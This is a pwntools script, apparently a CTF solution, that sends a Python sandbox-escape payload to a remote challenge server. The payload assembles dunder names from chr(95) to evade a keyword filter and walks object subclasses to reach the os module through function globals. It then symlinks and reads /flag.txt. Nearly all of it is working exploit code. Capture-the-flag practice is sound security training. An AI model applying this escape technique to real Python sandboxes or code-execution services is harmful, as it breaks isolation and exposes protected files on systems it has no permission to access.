from pwn import *

HOST = 'chall.0xfun.org'
PORT = 26510

# Payload cuối cùng: Bypass Warden -> Symlink tới /flag.txt
payload = """

u = chr(95)
uu = u + u
s_class = uu + "class" + uu
s_base = uu + "base" + uu
s_subclasses = uu + "subclasses" + uu
s_init = uu + "init" + uu
s_globals = uu + "globals" + uu

print("[-] Hunting for OS module...")
ListClass = getattr([], s_class)
ObjectClass = getattr(ListClass, s_base)
Subclasses = getattr(ObjectClass, s_subclasses)()

os_module = None

for cls in Subclasses:
    try:
        init = getattr(cls, s_init)
        glbs = getattr(init, s_globals)
        if "os" in glbs:
            os_module = glbs["os"]
            break
    except:
        continue

if os_module:
    link_path = "final_flag_link" 
    target = "/flag.txt"
    
    try:
        try:
            os_module.remove(link_path)
        except:
            pass
            
        print(f"[-] Symlinking {link_path} -> {target}...")
        
        os_module.symlink(target, link_path)
        
        print("[-] Opening file via symlink...")
        fd = os_module.open(link_path, 0) # 0 = O_RDONLY
        
        content = os_module.read(fd, 1024)
        
        print(content.decode('utf-8', errors='ignore').strip())
        
    except Exception as e:
        print(f"[!] Error: {e}")
else:
    print("[!] Failed to find OS module.")
"""

def solve():
    try:
        r = remote(HOST, PORT)
        r.recvuntil(b"Terminate with EOF (Ctrl+D).\n")
        
        print(f"[*] Sending payload ({len(payload)} bytes)...")
        r.send(payload.encode())
        
        # Gửi EOF để server bắt đầu chạy code
        r.shutdown('send') 

        # Đọc kết quả
        response = r.recvall().decode(errors='ignore')
        print(response)

    except Exception as e:
        print(f"[!] Connection error: {e}")

if __name__ == "__main__":
    solve()